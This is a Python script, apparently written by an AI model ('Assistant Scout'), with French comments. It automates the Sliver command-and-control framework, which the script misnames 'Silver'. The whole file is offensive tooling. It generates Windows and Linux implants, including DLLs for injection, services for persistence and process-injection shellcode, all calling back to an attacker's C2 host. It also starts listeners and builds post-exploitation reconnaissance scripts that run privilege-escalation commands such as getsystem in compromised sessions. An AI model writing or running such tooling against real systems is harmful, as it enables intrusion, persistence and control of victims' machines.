#!/usr/bin/env python3
"""
Scripts d'exemple pour automatiser les tâches Silver C2
Auteur: Assistant Scout
Version: 1.0

Ces scripts montrent comment automatiser certaines tâches courantes avec Silver C2.
Ils peuvent être adaptés selon vos besoins spécifiques.
"""

import os
import sys
import json
import time
import subprocess
from pathlib import Path
from typing import List, Dict, Optional

class SilverAutomation:
    """Classe pour automatiser les tâches Silver C2"""
    
    def __init__(self):
        self.workspace = Path.home() / "silver-workspace"
        self.payloads_dir = self.workspace / "payloads"
        self.logs_dir = self.workspace / "logs"
        
        # Créer les répertoires s'ils n'existent pas
        self.workspace.mkdir(exist_ok=True)
        self.payloads_dir.mkdir(exist_ok=True)
        self.logs_dir.mkdir(exist_ok=True)
    
    def log_info(self, message: str):
        """Affiche un message d'information"""
        print(f"[INFO] {message}")
    
    def log_success(self, message: str):
        """Affiche un message de succès"""
        print(f"[SUCCESS] {message}")
    
    def log_error(self, message: str):
        """Affiche un message d'erreur"""
        print(f"[ERROR] {message}")
    
    def run_command(self, command: str) -> tuple:
        """Exécute une commande système et retourne le résultat"""
        try:
            result = subprocess.run(
                command, 
                shell=True, 
                capture_output=True, 
                text=True, 
                timeout=30
            )
            return result.returncode, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            return -1, "", "Timeout expired"
        except Exception as e:
            return -1, "", str(e)
    
    def check_silver_installation(self) -> bool:
        """Vérifie si Silver est installé"""
        code, _, _ = self.run_command("which sliver-server")
        return code == 0
    
    def generate_payload(self, 
                        target_os: str = "windows",
                        arch: str = "amd64", 
                        format_type: str = "exe",
                        lhost: str = "192.168.1.100",
                        lport: int = 8080,
                        protocol: str = "http") -> Optional[str]:
        """Génère un payload Silver"""
        
        if not self.check_silver_installation():
            self.log_error("Silver C2 n'est pas installé")
            return None
        
        payload_name = f"implant_{target_os}_{arch}_{int(time.time())}.{format_type}"
        payload_path = self.payloads_dir / payload_name
        
        command = (
            f"sliver-client -c \"generate --{protocol} {lhost}:{lport} "
            f"--os {target_os} --arch {arch} --format {format_type} "
            f"--save {payload_path}\""
        )
        
        self.log_info(f"Génération du payload: {payload_name}")
        code, stdout, stderr = self.run_command(command)
        
        if code == 0:
            self.log_success(f"Payload généré: {payload_path}")
            return str(payload_path)
        else:
            self.log_error(f"Échec de génération: {stderr}")
            return None
    
    def start_listener(self, 
                      protocol: str = "http",
                      lhost: str = "0.0.0.0",
                      lport: int = 8080) -> bool:
        """Démarre un listener Silver"""
        
        command = f"sliver-client -c \"{protocol} --lhost {lhost} --lport {lport}\""
        
        self.log_info(f"Démarrage du listener {protocol} sur {lhost}:{lport}")
        code, stdout, stderr = self.run_command(command)
        
        if code == 0:
            self.log_success("Listener démarré")
            return True
        else:
            self.log_error(f"Échec du démarrage: {stderr}")
            return False
    
    def batch_payload_generation(self, targets: List[Dict]) -> List[str]:
        """Génère plusieurs payloads en lot"""
        
        generated_payloads = []
        
        for target in targets:
            payload_path = self.generate_payload(
                target_os=target.get("os", "windows"),
                arch=target.get("arch", "amd64"),
                format_type=target.get("format", "exe"),
                lhost=target.get("lhost", "192.168.1.100"),
                lport=target.get("lport", 8080),
                protocol=target.get("protocol", "http")
            )
            
            if payload_path:
                generated_payloads.append(payload_path)
                
            # Pause entre les générations
            time.sleep(2)
        
        return generated_payloads

class ReconnaissanceAutomation:
    """Automatisation des tâches de reconnaissance post-exploitation"""
    
    def __init__(self):
        self.commands = {
            "system_info": [
                "info",
                "whoami", 
                "getuid",
                "pwd"
            ],
            "network_info": [
                "ifconfig",
                "netstat",
                "arp"
            ],
            "process_info": [
                "ps",
                "ps -T"
            ],
            "security_info": [
                "getprivs",
                "getsystem"
            ]
        }
    
    def generate_recon_script(self, session_id: str, output_file: str = None) -> str:
        """Génère un script de reconnaissance automatique"""
        
        if not output_file:
            output_file = f"recon_session_{session_id}_{int(time.time())}.txt"
        
        script_content = f"""#!/bin/bash
# Script de reconnaissance automatique pour la session {session_id}
# Généré le {time.strftime('%Y-%m-%d %H:%M:%S')}

echo "=== RECONNAISSANCE AUTOMATIQUE ==="
echo "Session: {session_id}"
echo "Date: $(date)"
echo "=================================="
echo

"""
        
        for category, commands in self.commands.items():
            script_content += f'echo "=== {category.upper()} ==="\n'
            for cmd in commands:
                script_content += f'echo "Commande: {cmd}"\n'
                script_content += f'sliver-client -c "use {session_id}; {cmd}"\n'
                script_content += 'echo ""\n'
            script_content += 'echo ""\n'
        
        return script_content

class PayloadTemplates:
    """Templates de payloads pour différents scénarios"""
    
    @staticmethod
    def get_windows_templates() -> List[Dict]:
        """Retourne les templates pour Windows"""
        return [
            {
                "name": "Windows Standard",
                "os": "windows",
                "arch": "amd64", 
                "format": "exe",
                "description": "Exécutable Windows standard"
            },
            {
                "name": "Windows DLL",
                "os": "windows",
                "arch": "amd64",
                "format": "shared",
                "description": "DLL Windows pour injection"
            },
            {
                "name": "Windows Service",
                "os": "windows", 
                "arch": "amd64",
                "format": "service",
                "description": "Service Windows pour persistance"
            },
            {
                "name": "Windows Shellcode",
                "os": "windows",
                "arch": "amd64", 
                "format": "shellcode",
                "description": "Shellcode pour injection de processus"
            }
        ]
    
    @staticmethod
    def get_linux_templates() -> List[Dict]:
        """Retourne les templates pour Linux"""
        return [
            {
                "name": "Linux Standard",
                "os": "linux",
                "arch": "amd64",
                "format": "elf",
                "description": "Exécutable Linux standard"
            },
            {
                "name": "Linux Shared Library",
                "os": "linux", 
                "arch": "amd64",
                "format": "shared",
                "description": "Bibliothèque partagée Linux"
            }
        ]

def main():
    """Fonction principale avec menu interactif"""
    
    automation = SilverAutomation()
    recon = ReconnaissanceAutomation()
    
    while True:
        print("\n=== SILVER C2 AUTOMATION ===")
        print("1. Vérifier l'installation Silver")
        print("2. Générer un payload unique")
        print("3. Générer des payloads en lot")
        print("4. Démarrer un listener")
        print("5. Générer un script de reconnaissance")
        print("6. Afficher les templates de payloads")
        print("0. Quitter")
        
        choice = input("\nChoisissez une option: ").strip()
        
        if choice == "0":
            break
        elif choice == "1":
            if automation.check_silver_installation():
                automation.log_success("Silver C2 est installé")
            else:
                automation.log_error("Silver C2 n'est pas installé")
        
        elif choice == "2":
            print("\n--- Génération de payload ---")
            os_choice = input("OS (windows/linux/darwin) [windows]: ").strip() or "windows"
            arch = input("Architecture (amd64/386/arm64) [amd64]: ").strip() or "amd64"
            format_type = input("Format (exe/elf/macho/shared/service/shellcode) [exe]: ").strip() or "exe"
            lhost = input("IP du serveur C2 [192.168.1.100]: ").strip() or "192.168.1.100"
            lport = int(input("Port [8080]: ").strip() or "8080")
            protocol = input("Protocole (http/https/dns) [http]: ").strip() or "http"
            
            automation.generate_payload(os_choice, arch, format_type, lhost, lport, protocol)
        
        elif choice == "3":
            print("\n--- Génération en lot ---")
            targets = [
                {"os": "windows", "arch": "amd64", "format": "exe"},
                {"os": "windows", "arch": "386", "format": "exe"},
                {"os": "linux", "arch": "amd64", "format": "elf"}
            ]
            
            print("Génération des payloads par défaut...")
            payloads = automation.batch_payload_generation(targets)
            automation.log_success(f"{len(payloads)} payloads générés")
        
        elif choice == "4":
            print("\n--- Démarrage de listener ---")
            protocol = input("Protocole (http/https/dns) [http]: ").strip() or "http"
            lhost = input("IP d'écoute [0.0.0.0]: ").strip() or "0.0.0.0"
            lport = int(input("Port [8080]: ").strip() or "8080")
            
            automation.start_listener(protocol, lhost, lport)
        
        elif choice == "5":
            print("\n--- Script de reconnaissance ---")
            session_id = input("ID de session: ").strip()
            if session_id:
                script = recon.generate_recon_script(session_id)
                script_file = automation.workspace / f"recon_{session_id}.sh"
                
                with open(script_file, 'w') as f:
                    f.write(script)
                
                os.chmod(script_file, 0o755)
                automation.log_success(f"Script généré: {script_file}")
        
        elif choice == "6":
            print("\n--- Templates de payloads ---")
            print("\nWindows:")
            for template in PayloadTemplates.get_windows_templates():
                print(f"  - {template['name']}: {template['description']}")
            
            print("\nLinux:")
            for template in PayloadTemplates.get_linux_templates():
                print(f"  - {template['name']}: {template['description']}")
        
        else:
            automation.log_error("Option invalide")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nArrêt du programme...")
        sys.exit(0)
    except Exception as e:
        print(f"\nErreur: {e}")
        sys.exit(1)